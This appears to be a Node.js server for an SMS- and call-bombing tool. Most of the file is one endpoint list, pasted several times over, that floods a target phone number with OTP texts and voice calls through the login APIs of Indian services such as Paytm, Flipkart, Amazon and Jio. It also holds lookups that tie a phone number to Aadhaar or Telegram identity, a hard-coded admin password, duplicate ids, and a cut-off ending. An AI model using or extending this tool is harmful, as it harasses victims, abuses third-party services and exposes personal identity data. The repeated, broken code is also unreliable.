const express = require('express');
const cors = require('cors');
const axios = require('axios');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const requestIp = require('request-ip');
const useragent = require('useragent');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const moment = require('moment');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = 5500;
const ADMIN_PASSWORD = "shaiqua@74567";

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestIp.mw());

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));
app.use('/admin', express.static(path.join(__dirname, 'admin')));

// Create directories if not exist
if (!fs.existsSync('./public')) fs.mkdirSync('./public');
if (!fs.existsSync('./admin')) fs.mkdirSync('./admin');

// Load APIs with new endpoints - THIS SHOULD BE A JAVASCRIPT OBJECT, NOT JSON
let apisData = { 
  apis: [
    {
      "id": 1,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 2,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 3,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
